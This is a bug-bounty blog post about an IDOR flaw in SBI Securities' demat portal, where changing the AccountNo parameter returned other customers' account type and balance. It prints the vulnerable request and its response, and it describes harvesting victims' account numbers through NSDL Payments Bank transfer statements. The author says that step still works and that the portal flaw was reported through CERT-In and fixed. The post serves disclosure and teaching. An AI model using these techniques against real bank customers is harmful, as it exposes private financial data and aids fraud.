---
layout: post
title: How I Managed to Check Anyone’s SBI Bank Balance Using Just a Phone Number
date: 2025-10-21
summary: A parameter-tampering IDOR in a demat portal’s Get Balance workflow allowed unauthorized retrieval of account type and live Account balance by swapping the AccountNo value.
categories: VDP
tags: [IDOR]
published: true
---


<p align="center">
  <img src="/blog/images/SBI-banner.png">
</p>


Hello Bug Hunters,

Hope your bounties💸 are treating you well. Recently, I opened a bank account with SBI (I usually prefer private banks, but needed this for specific reasons). Like many government banks, they pushed additional add-ons — insurance and a demat account. Not knowing these weren't mandatory, I declined insurance but agreed to open a demat account.

The next day, I received my credentials via email and logged into my demat account. While exploring the platform, I noticed an interesting feature. Although I typically avoid testing assets that don't offer rewards (no money, no bugs), I figured this would only take 5 minutes to test.

In this write-up, I'll disclose a critical security flaw I discovered in SBI Bank's system that allowed me to check anyone's bank account balance using just their phone number and account number. (doesn't need to have a demat account)



### Vulnerability Overview:

The vulnerability was an **Insecure Direct Object Reference (IDOR)** in the "Get Balance" feature of the SBI Securities demat account portal. By manipulating the `AccountNo` parameter, I could retrieve the account balance of any SBI bank account. (doesn't need to have a demat account)

### Attack Prerequisites:

Getting Account details(Account Number): 


#### **Step 1:** Obtaining Account Details:(still works)

The main challenge was obtaining the victim's account number. From an attacker's perspective, bank account numbers aren't publicly available. However, I discovered that **NSDL Payments Bank** displays the receiver's complete account details in transaction statements — including account number, IFSC code, and name — when you send money via phone number or UPI ID.


<p align="center">
  <img src="/blog/images/nsdl-statement.jpg">
</p>


#### **Step 2:** Exploiting the IDOR Vulnerability to Obtain the Account Balance:

After logging into my demat account, I found a feature called "Get Balance" that fetches the bank account balance linked to the demat account. This feature had a critical flaw.

The request contained a `POST` parameter `&AccountNo=1234567890` that was vulnerable to IDOR. By replacing my account number with the victim's account number, the response revealed:

The victim's Account Balance & Account type `(S=Savings, C=Current)`

<p align="center">
  <img src="/blog/images/sbi-dashboard.png">
</p>

<p align="center">
  <img src="/blog/images/sbi-bug.jpeg">
</p>

### Technical Details:

### Vulnerable Request:

```http
POST /FundHoldandrelease?method=processOIResult HTTP/2
Host: trade.sbisecurities.in
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=YOUR_SESSION_ID
User-Agent: Mozilla/5.0
Referer: https://trade.sbisecurities.in/authenticate

ClientId=400086XXXX&UserId=722XXX1&sClientType=IC&BankId=004&AccountNo=443854XXXXX&TransactionType=3&Flag=BL&Channel=I&Terminal=ITS&theForm=fundholdreleaseform&checkID=40008XXXXX
```

### Response:

```yaml
HTTP/2 200 OK
Content-Type: application/json
Content-Length: 37
Content-Security-Policy: report-uri /report-csp.php
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000; includeSubDomains
Access-Control-Allow-Origin: https://trade.sbisecurities.in
Set-Cookie: BIGipServertrade.sbisecurities.in={redacted}; HttpOnly; Secure

{"code":"SUCCESS","data":"S|5407.19"}
```

The response format `"S|5407.19"` indicates:

- **S** = Savings account type
- **5407.19** = Current account balance in INR


### Disclosure and Resolution:

I responsibly disclosed this security flaw to [**CERT-In**](https://www.cert-in.org.in/), and they coordinated with SBI to fix the issue.

***

I hope you found this writeup informative. If you have any questions, feel free to reach out to me on [Linkedin](https://linkedin.com/in/nxtexploit).

May God reward you with goodness and abundant bounties.

**— Aziz Al Aman**
